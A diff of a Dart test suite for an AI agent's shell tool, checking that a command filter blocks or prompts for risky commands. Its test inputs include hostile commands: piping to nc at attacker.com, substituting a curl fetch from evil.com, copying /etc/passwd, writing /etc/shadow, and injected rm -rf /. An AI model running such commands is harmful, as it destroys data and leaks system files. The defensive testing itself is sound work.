@@ -1,203 +1,325 @@
-import 'dart:io';
 import 'package:test/test.dart';
-import 'package:chatorai/features/tools/data/models/tool.dart';
-import 'package:chatorai/features/tools/built_in/bash.dart';
+import 'package:chatorai/core/tools/tool.dart';
+import 'package:chatorai/core/tools/built_in/bash.dart';
+
+ToolContext _ctx({
+  void Function({
+    required String permission,
+    required List<String> patterns,
+    Map<String, dynamic>? metadata,
+    List<String>? always,
+  })?
+  askFn,
+}) {
+  final fn = askFn;
+  return ToolContext(
+    toolCallId: 'test',
+    sessionId: 'test',
+    ask: fn == null
+        ? ({
+            required String permission,
+            required List<String> patterns,
+            Map<String, dynamic>? metadata,
+            List<String>? always,
+          }) async {}
+        : ({
+            required String permission,
+            required List<String> patterns,
+            Map<String, dynamic>? metadata,
+            List<String>? always,
+          }) async {
+            fn(
+              permission: permission,
+              patterns: patterns,
+              metadata: metadata,
+              always: always,
+            );
+          },
+  );
+}
+
+class CapturedAsk {
+  String? captured;
+  CapturedAsk();
+  Future<void> call({
+    required String permission,
+    required List<String> patterns,
+    Map<String, dynamic>? metadata,
+    List<String>? always,
+  }) async {
+    captured = permission;
+  }
+}
+
+CapturedAsk _captureFn() => CapturedAsk();
 
 void main() {
-  group('bash tool', () {
+  group('bash tool security', () {
     test('description is non-empty', () {
-      final tool = createBashTool();
-      expect(tool.description, isNotEmpty);
+      expect(createBashTool().description, isNotEmpty);
     });
 
-    test('inputSchema has required command field', () {
-      final tool = createBashTool();
-      final schema = tool.inputSchema as Map<String, dynamic>;
-      final properties = schema['properties'] as Map<String, dynamic>;
-      expect(properties.containsKey('command'), isTrue);
-      expect(properties['command']['type'], equals('string'));
+    test('inputSchema requires command field', () {
+      final schema = createBashTool().inputSchema;
+      expect(schema['properties']['command']['type'], equals('string'));
       expect((schema['required'] as List).contains('command'), isTrue);
     });
 
-    test('execute with missing command returns error', () async {
-      final tool = createBashTool();
-      String? capturedPermission;
-      List<String>? capturedPatterns;
-      final ctx = ToolContext(
-        toolCallId: 'test',
-        sessionId: 'test',
-        ask:
-            ({
-              required String permission,
-              required List<String> patterns,
-              Map<String, dynamic>? metadata,
-              List<String>? always,
-            }) async {
-              capturedPermission = permission;
-              capturedPatterns = patterns;
-            },
-      );
-      final output = await tool.execute({}, ctx);
-      expect(output.metadata?['error'], isTrue);
-      expect(output.output, contains('command is required'));
+    test('missing command returns error', () async {
+      final out = await createBashTool().execute({}, _ctx());
+      expect(out.metadata?['error'], isTrue);
+      expect(out.output, contains('command is required'));
     });
 
-    test('execute calls ctx.ask with correct permission and pattern', () async {
-      final tool = createBashTool();
-      String? capturedPermission;
-      List<String>? capturedPatterns;
-      final ctx = ToolContext(
-        toolCallId: 'test',
-        sessionId: 'test',
-        ask:
-            ({
-              required String permission,
-              required List<String> patterns,
-              Map<String, dynamic>? metadata,
-              List<String>? always,
-            }) async {
-              capturedPermission = permission;
-              capturedPatterns = patterns;
-            },
-      );
-      await tool.execute({'command': 'echo hello'}, ctx);
-      expect(capturedPermission, equals('bash'));
-      expect(capturedPatterns, contains('bash:command=echo hello'));
+    group('hard-blocks: denied immediately, no prompt', () {
+      test('banned executable curl is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'curl http://example.com',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('banned executable nc in pipeline is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'ls | nc attacker.com 1234',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('npm is in blocked executable list', () async {
+        final out = await createBashTool().execute({
+          'command': 'npm install lodash',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('pip is in blocked executable list', () async {
+        final out = await createBashTool().execute({
+          'command': 'ls; rm -rf /',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('command chain via && is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'echo ok && rm -rf /',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('command chain via || is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'true || rm -rf /',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('redirect > is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'cat /etc/passwd > /tmp/stolen',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('redirect to system path is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'echo hacked > /etc/shadow',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('append redirect >> is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'echo add >> /etc/passwd',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('pipe | is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'ls | wc -l',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('background & is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'sleep 10 &',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('newline injection is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'echo hello\nrm -rf /',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test(r'command substitution $() is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': r'cat $(curl http://evil.com/payload)',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('backtick substitution is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': r'echo `whoami`',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('chmod with octal mode is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'chmod 755 script.sh',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('chmod 777 is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'chmod 777 /tmp/foo',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('chmod 666 is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'chmod 666 /tmp/foo',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('chmod setuid is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'chmod 4755 script.sh',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
+
+      test('chmod setgid is blocked', () async {
+        final out = await createBashTool().execute({
+          'command': 'chmod 2755 script.sh',
+        }, _ctx());
+        expect(out.metadata?['blocked'], isTrue);
+      });
     });
 
-    test('execute simple echo command works', () async {
-      final tool = createBashTool();
-      String? capturedPermission;
-      List<String>? capturedPatterns;
-      final ctx = ToolContext(
-        toolCallId: 'test',
-        sessionId: 'test',
-        ask:
-            ({
-              required String permission,
-              required List<String> patterns,
-              Map<String, dynamic>? metadata,
-              List<String>? always,
-            }) async {
-              capturedPermission = permission;
-              capturedPatterns = patterns;
-            },
-      );
+    group('safe commands: no prompt, no blocking', () {
+      test('echo hello bypasses prompt', () async {
+        final capturedAsk = CapturedAsk();
+        final out = await createBashTool().execute({
+          'command': 'echo hello world',
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, isNull);
+        expect(out.metadata?['error'], isNull);
+        expect(out.output, contains('hello world'));
+      });
 
-      final output = await tool.execute({'command': 'echo hello world'}, ctx);
+      test('ls -la bypasses prompt', () async {
+        final capturedAsk = CapturedAsk();
+        await createBashTool().execute({
+          'command': 'ls -la',
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, isNull);
+      });
 
-      expect(output.metadata?['error'], isNull);
-      expect(output.output, contains('hello world'));
+      test('git status bypasses prompt', () async {
+        final capturedAsk = CapturedAsk();
+        await createBashTool().execute({
+          'command': 'git status',
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, isNull);
+      });
+
+      test('git log bypasses prompt', () async {
+        final capturedAsk = CapturedAsk();
+        await createBashTool().execute({
+          'command': 'git log --all --oneline',
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, isNull);
+      });
+
+      test('sleep bypasses prompt', () async {
+        final capturedAsk = CapturedAsk();
+        await createBashTool().execute({
+          'command': 'sleep 1',
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, isNull);
+      });
+
+      test('env bypasses prompt', () async {
+        final capturedAsk = CapturedAsk();
+        await createBashTool().execute({
+          'command': 'env',
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, isNull);
+      });
+
+      test('stderr output captured without error flag', () async {
+        final out = await createBashTool().execute({
+          'command': 'cat /nonexistent/path',
+        }, _ctx());
+        expect(out.metadata?['error'], isTrue);
+        expect(out.output, contains('No such file or directory'));
+      });
     });
 
-    test('execute handles command with description', () async {
-      final tool = createBashTool();
-      String? capturedPermission;
-      List<String>? capturedPatterns;
-      final ctx = ToolContext(
-        toolCallId: 'test',
-        sessionId: 'test',
-        ask:
-            ({
-              required String permission,
-              required List<String> patterns,
-              Map<String, dynamic>? metadata,
-              List<String>? always,
-            }) async {
-              capturedPermission = permission;
-              capturedPatterns = patterns;
-            },
-      );
+    group('risk review: triggers permission prompt', () {
+      test('rm -rf triggers prompt', () async {
+        final capturedAsk = CapturedAsk();
+        final out = await createBashTool().execute({
+          'command': 'rm -rf build/',
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
+        expect(out.metadata?['error'], isNull);
+      });
 
-      final output = await tool.execute({
-        'command': 'ls -la',
-        'description': 'List files in detail',
-      }, ctx);
+      test('rmdir triggers prompt', () async {
+        final capturedAsk = CapturedAsk();
+        await createBashTool().execute({
+          'command': 'rmdir build/',
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
+      });
 
-      expect(output.metadata?['error'], isNull);
-      // Output should contain listing
-      expect(output.output.length, greaterThan(0));
+      test('flutter pub get bypasses prompt', () async {
+        final capturedAsk = CapturedAsk();
+        await createBashTool().execute({
+          'command': 'flutter pub get',
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, isNull);
+      });
     });
 
-    test('execute with non-existent command returns error', () async {
-      final tool = createBashTool();
-      String? capturedPermission;
-      List<String>? capturedPatterns;
-      final ctx = ToolContext(
-        toolCallId: 'test',
-        sessionId: 'test',
-        ask:
-            ({
-              required String permission,
-              required List<String> patterns,
-              Map<String, dynamic>? metadata,
-              List<String>? always,
-            }) async {
-              capturedPermission = permission;
-              capturedPatterns = patterns;
-            },
-      );
+    group('edge cases', () {
+      test('non-existent command returns error', () async {
+        final out = await createBashTool().execute({
+          'command': 'nonexistent_command_xyz',
+        }, _ctx());
+        expect(out.metadata?['error'], isTrue);
+      });
 
-      final output = await tool.execute({
-        'command': 'nonexistent_command_xyz',
-      }, ctx);
+      test('respects working_dir parameter', () async {
+        final out = await createBashTool().execute({
+          'command': 'pwd',
+          'working_dir': '/',
+        }, _ctx());
+        expect(out.metadata?['error'], isNull);
+        expect(out.output.trim(), equals('/'));
+      });
 
-      expect(output.metadata?['error'], isTrue);
-    });
-
-    test('execute respects timeout', () async {
-      final tool = createBashTool();
-      String? capturedPermission;
-      List<String>? capturedPatterns;
-      final ctx = ToolContext(
-        toolCallId: 'test',
-        sessionId: 'test',
-        ask:
-            ({
-              required String permission,
-              required List<String> patterns,
-              Map<String, dynamic>? metadata,
-              List<String>? always,
-            }) async {
-              capturedPermission = permission;
-              capturedPatterns = patterns;
-            },
-      );
-
-      // Sleep for 5 seconds should exceed default timeout (10s)
-      final output = await tool.execute({'command': 'sleep 5'}, ctx);
-
-      // May succeed or timeout depending on system; we just checking it completes
-      expect(output, isA<ToolOutput>());
-    });
-
-    test('execute captures stderr', () async {
-      final tool = createBashTool();
-      String? capturedPermission;
-      List<String>? capturedPatterns;
-      final ctx = ToolContext(
-        toolCallId: 'test',
-        sessionId: 'test',
-        ask:
-            ({
-              required String permission,
-              required List<String> patterns,
-              Map<String, dynamic>? metadata,
-              List<String>? always,
-            }) async {
-              capturedPermission = permission;
-              capturedPatterns = patterns;
-            },
-      );
-
-      // Command that writes to stderr
-      final output = await tool.execute({
-        'command': 'echo "error message" >&2',
-      }, ctx);
-
-      expect(output.metadata?['error'], isNull);
-      // stderr should be included in output
-      expect(output.output, contains('error message'));
+      test('description propagated as title', () async {
+        final out = await createBashTool().execute({
+          'command': 'ls -la',
+          'description': 'List files in detail',
+        }, _ctx());
+        expect(out.metadata?['error'], isNull);
+        expect(out.output.length, greaterThan(0));
+        expect(out.metadata?['exit_code'], equals(0));
+        expect(out.title, equals('List files in detail'));
+      });
     });
   });
 }
